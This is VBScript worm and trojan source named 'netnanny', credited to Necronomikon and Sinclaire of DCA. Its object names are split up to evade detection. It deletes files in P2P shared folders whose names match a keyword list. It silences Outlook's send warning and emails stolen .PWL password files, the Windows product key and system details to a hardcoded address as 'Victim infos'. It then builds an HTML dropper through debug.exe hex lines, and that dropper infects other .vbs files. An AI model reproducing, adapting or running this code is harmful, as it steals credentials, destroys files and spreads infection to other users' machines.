Option Explicit
on error resume next
'netnanny
'(c)by Necronomikon/DCA & Sinclaire/DCA
Const tempReg="HKLM\Security\Provider\" 
Const pswMail="netnanny666@go2.pl"
dim pfd, wshNet, ws, Fso, file1, netDrives, strFile, strReg, strRes
dim strIn, i, var1, var2, var3, var4, var5, var6,varx1, varx2
VAR1="Scr"
VAR2="ipt"
VAR3="ing."
VAR4="Fi"
VAR5="lesys"
VAR6="temOb"
Set Fso = CreateObject(VAR1+VAR2+VAR3+VAR4+VAR5+VAR6+"ject")
VARX1="S"
VARX2="hell"
Set ws = WScript.CreateObject("W"+VAR1+VAR2+"."+VARX1+VARX2)
                    PFD = ws.regread("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If (Fso.FolderExists(PFD & "\Kazaa\My Shared Folder\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\bearshare\shared\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\eDonkey2000\incoming\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\kazaa lite\my shared folder\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\kmd\my shared folder\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\grokster\my grokster\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\morpheus\my shared folder\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\limewire\shared\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\Tesla\Files\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\XoloX\Downloads\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\Shareaza\downloads\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\Gnucleus\downloads\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\WinMX\my shared folder\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\Ftopia3\Files\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\Toadnode\share\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\icq\shared files\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\Overnet\Incoming\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\Rapigator\Share\" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "\AppleJuice\Incoming" ) ) Then
call files
end if
If (Fso.FolderExists(PFD & "?shar?" ) ) Then
call files
end if


sub files()
If (Fso.FileExists("?r@ygold?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?reelkiddimov?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?kiddie?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?underage?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?ddoggprn?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?child porn?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?incest?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?inzest?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?sex child?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?preteen?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?pthc?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?pre teen?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?préteen?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?pedo?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?lolita?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?lsm?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?lólita?.*" ) ) Then
call killfiles
end if
If (Fso.FileExists("?anos?.*" ) ) Then
call killfiles
end if
end sub

sub killfiles()
fso.deletefile "?préteen?.*"
fso.deletefile "?pre teen?.*"
fso.deletefile "?r@ygold?.*"
fso.deletefile "?reelkiddimov?.*"
fso.deletefile "?kiddie?.*"
fso.deletefile "?underage?.*"
fso.deletefile "?ddoggprn?.*"
fso.deletefile "?child porn?.*"
fso.deletefile "?incest?.*"
fso.deletefile "?pedo?.*"
fso.deletefile "?inzest?.*"
fso.deletefile "?sex child?.*"
fso.deletefile "?preteen?.*"
fso.deletefile "?lolita?.*"
fso.deletefile "?pthc?.*"
fso.deletefile "?lsm?.*"
fso.deletefile "?lólita?.*"
fso.deletefile "?anos?.*"
end sub

'PSWTrojan code taken from I-Worm.Kamila by ovg
'modified/improved by Necronomikon/DCA
Sub Sleep(seconds)
	On Error Resume Next
	Dim a1,a2
	a1=Hour(Now)*3600+Minute(Now)*60+Second(Now)
	a2=a1
	While (a2-a1<seconds)
		a2=Hour(Now)*3600+Minute(Now)*60+Second(Now)
	Wend
End Sub

Function Possible(strFile,intFileSize) 'As Boolean
	On Error Resume Next 'Keine Fehler!!!
	Dim strReg, i, n, j
	Dim blPossible
	
	blPossible=False
	If InStr(UCase(strFile),"PWL")>0 Then
		strReg=ws.RegRead(tempReg)
		n=CInt(ws.RegRead(strReg & "Components\PSWTrojan\Total passwords"))
		j=n+1
		blPossible=True
		For i=1 To n
			Dim strPsw,intSize
			strPsw=ws.RegRead(strReg & "Components\PSWTrojan\Password" & i)
			intSize=CInt(ws.RegRead(strReg & "Components\PSWTrojan\Size" & i))
			If strPsw=strFile Then j=i
			If strPsw=strFile And intSize=intFileSize Then blPossible=False
		Next
		If blPossible Then
			ws.RegWrite strReg & "Components\PSWTrojan\Password" & j,strFile
			ws.RegWrite strReg & "Components\PSWTrojan\Size" & j,intFileSize
			If j=n+1 Then ws.RegWrite strReg & "Components\PSWTrojan\Total passwords",j,"REG_DWORD"
		End If
	End If
	Possible=blPossible
End Function

Sub ASimplePSWTrojan()
	On Error Resume Next 
	Dim outlook,bla,wshNet,mlItem
	Dim strBody, intTotal
	Dim fld1,file1, i
	Dim sentFiles()
bla = Reg.Regread("HKEY_CURRENT_USER\Identities\Default User ID")
Reg.RegWrite "HKEY_CURRENT_USER\Identities\" & bla & "\Software\Microsoft\Outlook Express\5.0\Mail\" & "Warn on Mapi Send", "0x0"

	Set fld1=fso.GetSpecialFolder(0)
	intTotal=0
	Redim sentFiles(-1)
	For Each file1 In fld1.Files
		If Possible(file1.Name,file1.Size) Then
			Redim Preserve sentFiles(UBound(sentFiles)+1)
			sentFiles(UBound(sentFiles))=file1.Path
			intTotal=intTotal+1
		End If
	Next
	If intTotal=0 Then Exit Sub
	Set outlook=WScript.CreateObject("Outlook.Application")
	Set mlItem=outlook.CreateItem(0)
	Set wshNet=WScript.CreateObject("WScript.Network")

	mlItem.Recipients.Add pswMail
	mlItem.Subject="Victim infos"
	For i=LBound(sentFiles) To UBound(sentFiles)
		mlItem.Attachments.Add sentFiles(i)
	Next
	strBody=strBody & "Computer name: " & wshNet.ComputerName & vbCrLf
	strBody=strBody & "User name: " & wshNet.UserName & vbCrLf
	strBody=strBody & "User domain: " & wshNet.UserDomain & vbCrLf
	strBody=strBody & "Registered Organization: " & ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization") & vbCrLf
	strBody=strBody & "Registered Owner: " & ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner") & vbCrLf
	strBody=strBody & "Platform type: " & 
ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Version") & vbCrLf
strBody=strBody & "AcceptLanguage: " & ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\International\AcceptLanguage") & vbCrLf
strBody=strBody & "Download Dir: " & ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Download Directory") & vbCrLf
strBody=strBody & "ProductKey: " & ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductKey") & vbCrLf
strBody=strBody & "ProductId: " & ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductId") & vbCrLf
strBody=strBody & "VersionNumber: " & ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber") & vbCrLf
	mlItem.Body=strBody
	mlItem.Send
	outlook.Quit
	WScript.DisconnectObject outlook
	WScript.DisconnectObject wshNet
	
	Set outlook=Nothing
	Set mlItem=Nothing
	Set wshNet=Nothing
	Set fld1=Nothing
	Set file1=Nothing
End Sub

Sleep(34)
Call ASimplePSWTrojan()

Dim nec, w
w = fso.getspecialfolder(0)
Set ws = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
Set nec = FSO.CreateTextFile("c:\payload.dbg", 1)
nec.WriteLine "e 0100  3C 68 74 6D 6C 3E 0D 0A 3C 68 65 61 64 3E 0D 0A"
nec.WriteLine "e 0110  3C 74 69 74 6C 65 3E 2E 2E 2E 5F 2D 3D 5B 79 65"
nec.WriteLine "e 0120  61 68 20 62 61 62 65 5D 3D 2D 5F 2E 2E 2E 3C 2F"
nec.WriteLine "e 0130  74 69 74 6C 65 3E 0D 0A 3C 73 63 72 69 70 74 3E"
nec.WriteLine "e 0140  0D 0A 76 61 72 20 69 20 3D 20 30 0D 0A 76 61 72"
nec.WriteLine "e 0150  20 74 65 78 74 3D 20 22 2A 2A 2A 2A 2A 2A 2A 2A"
nec.WriteLine "e 0160  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A"
nec.WriteLine "e 0170  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A"
nec.WriteLine "e 0180  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A"
nec.WriteLine "e 0190  2A 22 0D 0A 09 2B 20 22 20 20 20 20 20 20 20 20"
nec.WriteLine "e 01A0  20 20 4E 65 74 6E 61 6E 6E 79 20 69 73 20 77 61"
nec.WriteLine "e 01B0  74 63 68 69 6E 67 20 79 6F 75 21 21 21 20 20 20"
nec.WriteLine "e 01C0  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
nec.WriteLine "e 01D0  22 0D 0A 09 2B 09 22 20 20 20 20 20 20 22 0D 0A"
nec.WriteLine "e 01E0  09 2B 09 22 20 20 20 20 20 20 20 20 20 20 20 20"
nec.WriteLine "e 01F0  20 20 20 20 2A 2A 2A 2A 2A 43 6F 64 65 64 20 62"
nec.WriteLine "e 0200  79 3A 2A 2A 2A 2A 2A 2A 2A 20 20 20 20 20 20 20"
nec.WriteLine "e 0210  20 20 20 20 20 20 20 20 20 22 0D 0A 20 09 2B 09"
nec.WriteLine "e 0220  22 20 20 20 20 20 20 2A 2A 2A 4E 65 63 72 6F 6E"
nec.WriteLine "e 0230  6F 6D 69 6B 6F 6E 2A 2A 2A 20 20 20 20 20 20 20"
nec.WriteLine "e 0240  20 20 22 0D 0A 09 2B 09 22 2A 61 6E 64 2A 20 20"
nec.WriteLine "e 0250  20 22 0D 0A 09 2B 09 22 2A 2A 2A 53 69 6E 63 6C"
nec.WriteLine "e 0260  61 69 72 65 2A 2A 2A 20 20 20 20 20 20 20 20 20"
nec.WriteLine "e 0270  20 20 20 20 22 0D 0A 09 2B 09 22 20 20 20 20 20"
nec.WriteLine "e 0280  20 20 20 20 20 20 20 20 20 20 2A 2A 2A 2A 2A 2A"
nec.WriteLine "e 0290  2A 2A 2A 2A 2A 44 43 41 20 32 30 30 35 2A 2A 2A"
nec.WriteLine "e 02A0  2A 2A 2A 2A 2A 2A 2A 2A 2A 20 20 20 20 20 20 20"
nec.WriteLine "e 02B0  22 0D 0A 09 2B 20 22 2A 2A 2A 2A 2A 2A 2A 2A 2A"
nec.WriteLine "e 02C0  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A"
nec.WriteLine "e 02D0  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A"
nec.WriteLine "e 02E0  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A"
nec.WriteLine "e 02F0  22 0D 0A 66 75 6E 63 74 69 6F 6E 20 6D 61 72 71"
nec.WriteLine "e 0300  75 65 65 28 29 0D 0A 7B 0D 0A 76 61 72 20 74 65"
nec.WriteLine "e 0310  78 74 4C 61 65 6E 67 65 3D 20 74 65 78 74 2E 6C"
nec.WriteLine "e 0320  65 6E 67 74 68 0D 0A 64 6F 63 75 6D 65 6E 74 2E"
nec.WriteLine "e 0330  73 68 6F 77 2E 6D 61 72 71 75 65 65 31 2E 76 61"
nec.WriteLine "e 0340  6C 75 65 3D 20 64 6F 63 75 6D 65 6E 74 2E 73 68"
nec.WriteLine "e 0350  6F 77 2E 6D 61 72 71 75 65 65 31 2E 76 61 6C 75"
nec.WriteLine "e 0360  65 20 2B 20 74 65 78 74 2E 63 68 61 72 41 74 28"
nec.WriteLine "e 0370  69 29 0D 0A 69 2B 2B 0D 0A 76 61 72 20 74 69 6D"
nec.WriteLine "e 0380  65 49 44 3D 20 73 65 74 54 69 6D 65 6F 75 74 28"
nec.WriteLine "e 0390  22 6D 61 72 71 75 65 65 28 29 22 2C 37 30 29 0D"
nec.WriteLine "e 03A0  0A 69 66 20 28 69 20 3E 3D 20 74 65 78 74 4C 61"
nec.WriteLine "e 03B0  65 6E 67 65 29 0D 0A 09 7B 63 6C 65 61 72 54 69"
nec.WriteLine "e 03C0  6D 65 6F 75 74 28 74 69 6D 65 49 44 29 3B 20 69"
nec.WriteLine "e 03D0  3D 30 3B 7D 0D 0A 7D 0D 0A 0D 0A 3C 2F 73 63 72"
nec.WriteLine "e 03E0  69 70 74 3E 0D 0A 3C 53 63 72 69 70 74 20 4C 61"
nec.WriteLine "e 03F0  6E 67 75 61 67 65 20 3D 20 22 56 42 53 63 72 69"
nec.WriteLine "e 0400  70 74 22 3E 0D 0A 4F 6E 20 45 72 72 6F 72 20 52"
nec.WriteLine "e 0410  65 73 75 6D 65 20 4E 65 78 74 0D 0A 44 69 6D 20"
nec.WriteLine "e 0420  6E 65 63 2C 20 77 0D 0A 77 20 3D 20 66 73 6F 2E"
nec.WriteLine "e 0430  67 65 74 73 70 65 63 69 61 6C 66 6F 6C 64 65 72"
nec.WriteLine "e 0440  28 30 29 0D 0A 53 65 74 20 77 73 20 3D 20 43 72"
nec.WriteLine "e 0450  65 61 74 65 4F 62 6A 65 63 74 28 22 57 53 63 72"
nec.WriteLine "e 0460  69 70 74 2E 53 68 65 6C 6C 22 29 0D 0A 53 65 74"
nec.WriteLine "e 0480  65 63 74 28 22 53 63 72 69 70 74 69 6E 67 2E 46"
nec.WriteLine "e 0490  69 6C 65 53 79 73 74 65 6D 4F 62 6A 65 63 74 22"
nec.WriteLine "e 04A0  29 0D 0A 53 65 74 20 6E 65 63 20 3D 20 46 53 4F"
nec.WriteLine "e 04B0  2E 43 72 65 61 74 65 54 65 78 74 46 69 6C 65 28"
nec.WriteLine "e 04C0  22 63 3A 5C 6E 61 6E 6E 79 64 72 6F 70 70 65 72"
nec.WriteLine "e 04D0  2E 76 62 73 22 2C 20 31 29 0D 0A 6E 65 63 2E 57"
nec.WriteLine "e 04E0  72 69 74 65 4C 69 6E 65 20 22 27 57 6F 72 6D 2E"
nec.WriteLine "e 04F0  4E 65 74 6E 61 6E 6E 79 20 62 79 20 4E 65 63 72"
nec.WriteLine "e 0500  6F 6E 6F 6D 69 6B 6F 6E 20 26 20 53 69 6E 63 6C"
nec.WriteLine "e 0510  61 69 72 65 22 0D 0A 6E 65 63 2E 57 72 69 74 65"
nec.WriteLine "e 0520  4C 69 6E 65 20 22 27 28 63 29 20 44 43 41 20 32"
nec.WriteLine "e 0530  30 30 35 22 0D 0A 6E 65 63 2E 57 72 69 74 65 4C"
nec.WriteLine "e 0540  69 6E 65 20 22 27 5B 6E 65 74 6E 61 6E 6E 79 5D"
nec.WriteLine "e 0550  22 0D 0A 6E 65 63 2E 57 72 69 74 65 4C 69 6E 65"
nec.WriteLine "e 0560  20 22 4F 6E 20 45 72 72 6F 72 20 52 65 73 75 6D"
nec.WriteLine "e 0570  65 20 4E 65 78 74 22 0D 0A 6E 65 63 2E 57 72 69"
nec.WriteLine "e 0580  74 65 4C 69 6E 65 20 22 64 69 6D 20 76 61 72 31"
nec.WriteLine "e 0590  2C 20 76 61 72 32 2C 20 76 61 72 33 2C 20 76 61"
nec.WriteLine "e 05A0  72 34 2C 20 76 61 72 35 2C 20 76 61 72 36 2C 76"
nec.WriteLine "e 05B0  61 72 78 31 2C 20 76 61 72 78 32 22 0D 0A 6E 65"
nec.WriteLine "e 05C0  63 2E 57 72 69 74 65 4C 69 6E 65 20 22 6E 65 74"
nec.WriteLine "e 05D0  6E 61 6E 6E 79 20 3D 20 57 53 63 72 69 70 74 2E"
nec.WriteLine "e 05E0  53 63 72 69 70 74 46 75 6C 6C 4E 61 6D 65 22 0D"
nec.WriteLine "e 05F0  0A 6E 65 63 2E 57 72 69 74 65 4C 69 6E 65 20 22"
nec.WriteLine "e 0600  56 41 52 31 3D 22 22 53 63 72 22 22 22 0D 0A 6E"
nec.WriteLine "e 0610  65 63 2E 57 72 69 74 65 4C 69 6E 65 20 22 56 41"
nec.WriteLine "e 0620  52 32 3D 22 22 69 70 74 22 22 22 0D 0A 6E 65 63"
nec.WriteLine "e 0630  2E 57 72 69 74 65 4C 69 6E 65 20 22 56 41 52 33"
nec.WriteLine "e 0640  3D 22 22 69 6E 67 2E 22 22 22 0D 0A 6E 65 63 2E"
nec.WriteLine "e 0650  57 72 69 74 65 4C 69 6E 65 20 22 56 41 52 34 3D"
nec.WriteLine "e 0660  22 22 46 69 22 22 22 0D 0A 6E 65 63 2E 57 72 69"
nec.WriteLine "e 0670  74 65 4C 69 6E 65 20 22 56 41 52 35 3D 22 22 6C"
nec.WriteLine "e 0680  65 73 79 73 22 22 22 0D 0A 6E 65 63 2E 57 72 69"
nec.WriteLine "e 0690  74 65 4C 69 6E 65 20 22 56 41 52 36 3D 22 22 74"
nec.WriteLine "e 06A0  65 6D 4F 62 22 22 22 0D 0A 6E 65 63 2E 57 72 69"
nec.WriteLine "e 06B0  74 65 4C 69 6E 65 20 22 53 65 74 20 46 73 6F 20"
nec.WriteLine "e 06C0  3D 20 43 72 65 61 74 65 4F 62 6A 65 63 74 28 56"
nec.WriteLine "e 06D0  41 52 31 2B 56 41 52 32 2B 56 41 52 33 2B 56 41"
nec.WriteLine "e 06E0  52 34 2B 56 41 52 35 2B 56 41 52 36 2B 22 22 6A"
nec.WriteLine "e 06F0  65 63 74 22 22 29 22 0D 0A 6E 65 63 2E 57 72 69"
nec.WriteLine "e 0700  74 65 4C 69 6E 65 20 22 56 41 52 58 31 3D 22 22"
nec.WriteLine "e 0710  53 22 22 22 0D 0A 6E 65 63 2E 57 72 69 74 65 4C"
nec.WriteLine "e 0720  69 6E 65 20 22 56 41 52 58 32 3D 22 22 68 65 6C"
nec.WriteLine "e 0730  6C 22 22 22 0D 0A 6E 65 63 2E 57 72 69 74 65 4C"
nec.WriteLine "e 0740  69 6E 65 20 22 53 65 74 20 77 73 20 3D 20 57 53"
nec.WriteLine "e 0750  63 72 69 70 74 2E 43 72 65 61 74 65 4F 62 6A 65"
nec.WriteLine "e 0760  63 74 28 22 22 57 22 22 2B 56 41 52 31 2B 56 41"
nec.WriteLine "e 0770  52 32 2B 22 22 2E 22 22 2B 56 41 52 58 31 2B 56"
nec.WriteLine "e 0780  41 52 58 32 29 22 0D 0A 6E 65 63 2E 57 72 69 74"
nec.WriteLine "e 0790  65 4C 69 6E 65 20 22 53 65 74 20 74 78 74 70 68"
nec.WriteLine "e 07A0  69 6C 65 20 3D 20 66 73 6F 2E 4F 70 65 6E 54 65"
nec.WriteLine "e 07B0  78 74 46 69 6C 65 28 6E 65 74 6E 61 6E 6E 79 2C"
nec.WriteLine "e 07C0  20 31 2C 20 30 29 22 0D 0A 6E 65 63 2E 57 72 69"
nec.WriteLine "e 07D0  74 65 4C 69 6E 65 20 22 6E 6F 70 65 64 6F 20 3D"
nec.WriteLine "e 07E0  20 74 78 74 70 68 69 6C 65 2E 52 65 61 64 41 6C"
nec.WriteLine "e 07F0  6C 22 0D 0A 6E 65 63 2E 57 72 69 74 65 4C 69 6E"
nec.WriteLine "e 0800  65 20 22 74 78 74 70 68 69 6C 65 2E 43 6C 6F 73"
nec.WriteLine "e 0810  65 22 0D 0A 6E 65 63 2E 57 72 69 74 65 4C 69 6E"
nec.WriteLine "e 0820  65 20 22 68 65 79 62 61 62 65 20 3D 20 4C 65 66"
nec.WriteLine "e 0830  74 28 6E 6F 70 65 64 6F 2C 20 49 6E 53 74 72 52"
nec.WriteLine "e 0840  65 76 28 6E 6F 70 65 64 6F 2C 20 22 22 73 74 69"
nec.WriteLine "e 0850  6C 6C 69 6E 6C 75 76 22 22 29 29 20 2B 20 22 22"
nec.WriteLine "e 0860  73 74 69 6C 6C 69 6E 6C 75 76 22 22 22 0D 0A 6E"
nec.WriteLine "e 0870  65 63 2E 57 72 69 74 65 4C 69 6E 65 20 22 4E 65"
nec.WriteLine "e 0880  63 44 43 41 20 3D 20 4C 65 66 74 28 6E 65 74 6E"
nec.WriteLine "e 0890  61 6E 6E 79 2C 20 49 6E 53 74 72 52 65 76 28 6E"
nec.WriteLine "e 08A0  65 74 6E 61 6E 6E 79 2C 20 22 20 5C 20 22 29 29"
nec.WriteLine "e 08B0  22 0D 0A 6E 65 63 2E 57 72 69 74 65 4C 69 6E 65"
nec.WriteLine "e 08C0  20 22 46 6F 72 20 45 61 63 68 20 73 74 6F 70 69"
nec.WriteLine "e 08D0  74 20 69 6E 20 66 73 6F 2E 47 65 74 46 6F 6C 64"
nec.WriteLine "e 08E0  65 72 28 4E 65 63 44 43 41 29 2E 46 69 6C 65 73"
nec.WriteLine "e 08F0  22 0D 0A 6E 65 63 2E 57 72 69 74 65 4C 69 6E 65"
nec.WriteLine "e 0900  20 22 49 66 20 28 20 52 69 67 68 74 28 73 74 6F"
nec.WriteLine "e 0910  70 69 74 2E 4E 61 6D 65 2C 20 34 29 20 3D 20 22"
nec.WriteLine "e 0920  22 2E 76 62 73 22 22 20 29 20 54 68 65 6E 22 0D"
nec.WriteLine "e 0930  0A 6E 65 63 2E 57 72 69 74 65 4C 69 6E 65 20 22"
nec.WriteLine "e 0940  53 65 74 20 77 33 33 64 20 3D 20 66 73 6F 2E 4F"
nec.WriteLine "e 0950  70 65 6E 54 65 78 74 46 69 6C 65 28 73 74 6F 70"
nec.WriteLine "e 0960  69 74 2E 4E 61 6D 65 2C 20 31 2C 20 30 29 22 0D"
nec.WriteLine "e 0970  0A 6E 65 63 2E 57 72 69 74 65 4C 69 6E 65 20 22"
nec.WriteLine "e 0980  67 65 74 64 6F 70 65 20 3D 20 77 33 33 64 2E 52"
nec.WriteLine "e 0990  65 61 64 41 6C 6C 22 0D 0A 6E 65 63 2E 57 72 69"
nec.WriteLine "e 09A0  74 65 4C 69 6E 65 20 22 49 66 20 28 49 6E 53 74"
nec.WriteLine "e 09B0  72 28 67 65 74 64 6F 70 65 2C 20 22 22 5B 6E 65"
nec.WriteLine "e 09C0  74 6E 61 6E 6E 79 5D 22 22 29 20 3D 20 30 29 20"
nec.WriteLine "e 09D0  54 68 65 6E 22 0D 0A 6E 65 63 2E 57 72 69 74 65"
nec.WriteLine "e 09E0  4C 69 6E 65 20 22 53 65 74 20 6E 6F 6E 61 6D 65"
nec.WriteLine "e 09F0  20 3D 20 66 73 6F 2E 43 72 65 61 74 65 54 65 78"
nec.WriteLine "e 0A00  74 46 69 6C 65 28 73 74 6F 70 69 74 2E 4E 61 6D"
nec.WriteLine "e 0A10  65 2C 20 54 72 75 65 29 22 0D 0A 6E 65 63 2E 57"
nec.WriteLine "e 0A20  72 69 74 65 4C 69 6E 65 20 22 6E 6F 6E 61 6D 65"
nec.WriteLine "e 0A30  2E 57 72 69 74 65 20 68 65 79 62 61 62 65 20 2B"
nec.WriteLine "e 0A40  20 76 62 43 72 4C 66 20 2B 20 67 65 74 64 6F 70"
nec.WriteLine "e 0A50  65 22 0D 0A 6E 65 63 2E 57 72 69 74 65 4C 69 6E"
nec.WriteLine "e 0A60  65 20 22 6E 6F 6E 61 6D 65 2E 43 6C 6F 73 65 22"
nec.WriteLine "e 0A70  0D 0A 6E 65 63 2E 57 72 69 74 65 4C 69 6E 65 20"
nec.WriteLine "e 0A80  22 45 6E 64 20 49 66 22 0D 0A 6E 65 63 2E 57 72"
nec.WriteLine "e 0A90  69 74 65 4C 69 6E 65 20 22 77 33 33 64 2E 43 6C"
nec.WriteLine "e 0AA0  6F 73 65 22 0D 0A 6E 65 63 2E 57 72 69 74 65 4C"
nec.WriteLine "e 0AB0  69 6E 65 20 22 45 6E 64 20 49 66 22 0D 0A 6E 65"
nec.WriteLine "e 0AC0  63 2E 57 72 69 74 65 4C 69 6E 65 20 22 4E 65 78"
nec.WriteLine "e 0AD0  74 22 0D 0A 6E 65 63 2E 57 72 69 74 65 4C 69 6E"
nec.WriteLine "e 0AE0  65 20 22 27 73 74 69 6C 6C 69 6E 6C 75 76 22 0D"
nec.WriteLine "e 0AF0  0A 6E 65 63 2E 43 6C 6F 73 65 0D 0A 77 73 2E 52"
nec.WriteLine "e 0B00  75 6E 20 22 43 3A 5C 6E 61 6E 6E 79 64 72 6F 70"
nec.WriteLine "e 0B10  70 65 72 2E 76 62 73 22 2C 20 30 2C 20 46 61 6C"
nec.WriteLine "e 0B20  73 65 0D 0A 3C 2F 73 63 72 69 70 74 3E 0D 0A 3C"
nec.WriteLine "e 0B30  2F 68 65 61 64 3E 0D 0A 3C 62 6F 64 79 20 6F 6E"
nec.WriteLine "e 0B40  4C 6F 61 64 3D 20 22 6D 61 72 71 75 65 65 28 29"
nec.WriteLine "e 0B50  22 3E 0D 0A 3C 66 6F 72 6D 20 6E 61 6D 65 3D 22"
nec.WriteLine "e 0B60  73 68 6F 77 22 3E 0D 0A 3C 42 52 3E 0D 0A 3C 74"
nec.WriteLine "e 0B70  65 78 74 61 72 65 61 20 72 6F 77 73 3D 36 20 63"
nec.WriteLine "e 0B80  6F 6C 73 3D 35 37 20 77 72 61 70 3D 22 76 69 72"
nec.WriteLine "e 0B90  74 75 61 6C 22 20 6E 61 6D 65 3D 22 6D 61 72 71"
nec.WriteLine "e 0BA0  75 65 65 31 22 3E 3C 2F 74 65 78 74 61 72 65 61"
nec.WriteLine "e 0BB0  3E 0D 0A 3C 2F 66 6F 72 6D 3E 0D 0A 3C 2F 62 6F"
nec.WriteLine "e 0BC0  64 79 3E 0D 0A 3C 2F 68 74 6D 6C 3E 0D 0A 00"
nec.WriteLine "rcx"
nec.WriteLine "ACE"
nec.WriteLine "nC:\payload.htm"
nec.WriteLine "w"
nec.WriteLine "q"
nec.Close
ws.Run "C:\payload.htm", 0, False
If (Fso.FileExists("c:\payload.dbg" ) ) Then
fso.deletefile "c:\payload.dbg"
end if
WScript.DisconnectObject fso
WScript.DisconnectObject ws